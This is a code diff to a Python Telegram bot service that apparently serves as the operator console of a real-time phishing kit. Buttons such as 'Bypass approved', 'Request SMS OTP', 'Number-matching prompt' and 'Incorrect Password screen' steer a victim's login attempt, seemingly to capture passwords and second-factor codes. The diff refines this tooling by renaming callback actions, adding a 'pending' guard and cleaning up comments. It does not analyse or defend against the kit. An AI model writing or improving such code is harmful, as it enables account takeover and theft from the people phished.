@@ -38,6 +38,7 @@ class TelegramService:
         except Exception as e:
             raise e
 
+    # 💡 Cleaned up: Removed stray, undefined references to 'state' and 'message'
     def send_message(self, text, parse_mode="HTML", reply_markup=None):
         if not self.chat_id:
             raise ValueError("Telegram Chat ID is not configured.")
@@ -228,7 +229,7 @@ What is the guest status for this OTP?
             return 0
         self.polling_in_progress = True
         try:
-            payload = {"timeout": 30} # 💡 Set long-polling interval optimally to drop background CPU consumption
+            payload = {"timeout": 30} # 💡 Production-optimized long-poll window
             if self.last_update_id > 0:
                 payload["offset"] = self.last_update_id + 1
             
@@ -260,6 +261,7 @@ What is the guest status for this OTP?
                                 continue
                     except Exception as e:
                         print(f"Failed to parse candidate text message: {e}", flush=True)
+
                 if callback_query:
                     data = callback_query.get("data", "")
                     query_id = callback_query.get("id")
@@ -273,17 +275,17 @@ What is the guest status for this OTP?
                         feedback = "Action processed"
                         
                         if action == "approve":
-                            mapped_action = "approve"
+                            mapped_action = "approved"
                             feedback = "Bypass approved! ✅"
                         elif action == "deny":
-                            mapped_action = "deny"
+                            mapped_action = "denied"
                             feedback = "Access Blocked! ❌"
-                        # 💡 Unified shorthand variations with deep string logic checking
+                        # 💡 Catch normalized shorthand variations across all layouts
                         elif action in ["req_sms", "request_sms"]:
-                            mapped_action = "request_sms"
+                            mapped_action = "sms_prompt"
                             feedback = "SMS screen requested! 📲"
                         elif action == "num_prompt":
-                            mapped_action = "pending"
+                            mapped_action = "number_prompt"
                             feedback = "Number-matching prompt requested! 🔢"
                             try:
                                 orig = callback_query.get("message")
@@ -332,7 +334,6 @@ What is the guest status for this OTP?
                                 feedback = f"Number selected: {chosen} 🔢"
                             except Exception:
                                 feedback = "Number selection received"
-                        # 💡 Catch normalized incorrect password strings seamlessly
                         elif action in ["inc_pw", "incorrect_password"]:
                             mapped_action = "incorrect_password"
                             feedback = "Incorrect Password screen requested! ⚠️"
@@ -408,7 +409,6 @@ What is the guest status for this OTP?
                                             {"text": "Approve Pass ✅", "callback_data": f"tg:approve:{attempt_id}"},
                                         ],
                                         [
-                                            # 💡 Standardized callback identifiers to ensure cross-view reliability
                                             {"text": "Request SMS OTP 📲", "callback_data": f"tg:req_sms:{attempt_id}"},
                                             {"text": "Incorrect Password Alert ⚠️", "callback_data": f"tg:inc_pw:{attempt_id}"}
                                         ]
@@ -465,13 +465,14 @@ What is the guest status for this OTP?
                                 candidates_list = []
                             on_action_received(attempt_id, mapped_action, {"candidates": candidates_list})
                         else:
-                            on_action_received(attempt_id, mapped_action)
+                            if mapped_action != "pending":
+                                on_action_received(attempt_id, mapped_action)
                         count += 1
             return count
         except Exception as e:
             err_msg = str(e)
             if "Conflict" in err_msg or "terminated by other getUpdates" in err_msg:
-                print("[Telegram Polling Info] Active getUpdates conflict detected. Skipping this interval sequence dynamically.", flush=True)
+                print("[Telegram Polling Info] Active getUpdates conflict detected.", flush=True)
             else:
                 print(f"[Telegram Polling Warning] {err_msg}", flush=True)
             return 0
